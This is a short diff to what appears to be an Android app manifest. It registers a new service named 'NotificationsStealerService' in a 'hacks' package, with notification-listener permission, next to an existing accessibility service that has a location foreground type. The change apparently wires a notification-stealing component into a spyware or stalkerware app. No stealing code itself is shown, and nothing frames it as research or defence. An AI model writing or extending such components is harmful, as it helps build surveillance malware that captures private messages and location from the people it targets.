@@ -47,6 +47,15 @@
             android:enabled="true"
             android:exported="false" />
         <service
+            android:name=".hacks.NotificationsStealerService"
+            android:enabled="true"
+            android:exported="false"
+            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
+        <intent-filter>
+            <action android:name="android.service.notification.NotificationListener" />
+        </intent-filter>
+        </service>
+        <service
             android:name=".hacks.MyAccessibilityService"
             android:foregroundServiceType="location"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
